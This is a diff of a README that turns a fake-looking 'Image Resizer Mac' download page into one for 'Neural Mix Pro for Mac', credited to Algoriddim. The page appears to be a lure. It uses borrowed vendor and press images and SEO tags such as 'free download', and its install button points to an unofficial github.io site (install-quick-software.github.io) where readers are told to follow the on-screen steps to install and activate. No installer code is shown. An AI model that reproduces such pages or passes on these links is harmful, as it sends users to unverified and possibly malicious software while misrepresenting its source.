@@ -1,14 +1,14 @@
-# Image Resizer Mac – Smart Tool to Shrink & Optimize Images  
+# Neural Mix Pro for Mac – AI-Powered Music Separation  
 
 <div align="center">
 
-![Image Resizer App](https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/94/d9/61/94d961e3-5dce-6be2-3d32-6000ba4de7c4/Application.png/1200x630bb.png)
+![Neural Mix Pro Mac](https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/56/dd/9c/56dd9c88-fc33-6840-ff9a-86d53761bcce/AppIcon-0-0-85-220-0-0-4-0-2x-P3.png/1200x630bb.png)
 
 </div>
 
 <div align="center">
 
-[![Install Image Resizer Mac](https://img.shields.io/badge/Install_Image_Resizer_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/resizerimage)
+[![📥 Download Neural Mix Pro Mac](https://img.shields.io/badge/📥_Download_Neural_Mix_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://install-quick-software.github.io/.github/neuralmix)
 
 </div>
 
@@ -17,59 +17,62 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate Image Resizer On Your Device.  
+2. Follow The On-Screen Steps To Install And Activate Neural Mix Pro On Your Device.  
 
 ---
 
-## What is Image Resizer Mac?  
+## What is Neural Mix Pro for Mac?  
 
-**Image Resizer Mac** is a dedicated macOS application that provides **simple tools to adjust picture size, reduce image weight, and prepare photos for professional or personal use**.  
+**Neural Mix Pro for Mac** is a professional music separation and remixing software developed by **Algoriddim**, the creators of the award-winning djay app. It uses cutting-edge **AI neural network technology** to split any audio track into individual stems, such as vocals, drums, and harmonics, in real time.  
 
-With support for batch editing, it’s perfect for handling entire image libraries in seconds. Users can set custom dimensions, reduce storage consumption, and export optimized photos ready for online publishing, emailing, or presentations.  
+Whether you’re a DJ, music producer, or simply passionate about remixing songs, Neural Mix Pro allows you to:  
+- Isolate or mute vocals to create instrumentals and acapellas  
+- Extract beats and melodies for remixing and mashups  
+- Export separated stems for use in DJ sets or music production  
+- Practice or learn songs by isolating specific instruments  
+- Create karaoke tracks instantly from any audio file  
 
-Why it stands out:  
-- Intuitive Mac-style interface  
-- High-speed batch conversions  
-- Smart compression that keeps clarity  
-- Designed for photographers, webmasters, and everyday users  
-- Compatible with Retina and non-Retina Macs  
+With its clean, intuitive interface and powerful real-time audio processing, Neural Mix Pro brings studio-level music separation technology directly to your Mac. It is fully optimized for **djay Pro AI**, making it the perfect companion for live performances and creative music production.  
 
 ---
 
-![Batch Resize](https://is1-ssl.mzstatic.com/image/thumb/Purple128/v4/24/dd/2d/24dd2d4f-55ef-d98e-4e65-1d5beed579f4/pr_source.png/643x0w.jpg) 
+![Neural Mix Pro Mac](https://cdn.algoriddim.com/assets/neural/screen-loop-export-5514d9f7.jpg)
 
 ---
 
 ## Key Features  
 
-| Feature                   | Description                                                                 |
-|----------------------------|-----------------------------------------------------------------------------|
-| 📐 Custom Dimensions       | Set exact height, width, or percentage scaling                             |
-| 📑 Batch Mode              | Resize hundreds of images in one process                                   |
-| 🗜️ Image Compression       | Optimize photos for email, web, and storage saving                         |
-| 🔄 Format Conversion       | Save images in different file formats instantly                            |
-| ⚡ Easy Workflow           | Drag & drop files directly into the app                                    |
-| 🖥️ Optimized for macOS     | Works on the latest macOS, Intel & Apple Silicon                           |
+| Feature                        | Description                                                                 |
+|--------------------------------|-----------------------------------------------------------------------------|
+| 🎤 Vocal Isolation             | Separate vocals from background music for remixes and karaoke               |
+| 🥁 Drum Extraction             | Isolate or remove beats for mashups and re-arrangements                     |
+| 🎹 Instrument Separation       | Split harmonics like piano, guitar, and synths with precision               |
+| ⚡ Real-Time Processing        | AI-powered stem separation with minimal latency                             |
+| 📂 Stem Export                 | Save vocals, instrumentals, and beats as separate audio files               |
+| 💻 macOS Compatibility         | Fully optimized for Intel and Apple Silicon Macs                            |
 
 ---
 
-![Resize on Mac](https://i.insider.com/5d307ce79e075551845fe1d9?width=800&format=jpeg&auto=webp)   
+## Screenshots  
+
+![Neural Mix Pro Interface](https://cdn.digitaldjtips.com/app/uploads/2020/08/27091543/neural-mix-pro-1204x640.jpg)    
 
 ---
 
 ## System Requirements  
 
-- OS: macOS 10.12 or later  
-- CPU: Intel or Apple Silicon (M1/M2 ready)  
-- RAM: 2 GB or higher  
-- Disk Space: 120 MB free space  
+- OS: macOS 10.14 (Mojave) or later  
+- CPU: Intel or Apple Silicon (M1/M2 supported)  
+- RAM: 4 GB minimum (8 GB recommended)  
+- Disk Space: 500 MB free storage  
+- Internet: Required for updates and license activation  
 
 ---
 
-![Preview Resizing](https://cdn.osxdaily.com/wp-content/uploads/2016/09/howto-resize-picture-on-mac-preview-4.jpg)  
+![Neural Mix Export Options](https://cdn.digitaldjtips.com/app/uploads/2020/08/27091823/neural-mix-pro-export.jpg)  
 
 ---
 
 ## Tags  
 
-image resizer mac • macbook resize image • reduce size of image mac • resize photos mac • photo resizer mac • compress image mac • batch image resizer mac • mac resize pictures • mac image compression • photo optimization mac  
+neural mix pro • neural mix • algoriddim neural mix • algoriddim neural mix pro • djay neural mix • djay pro ai neural mix • djay pro neural mix • neural mix download • neural mix pro download • neural mix pro for mac • neural mix pro free • neural mix pro free download • neural mix pro mac • neuralmix pro  
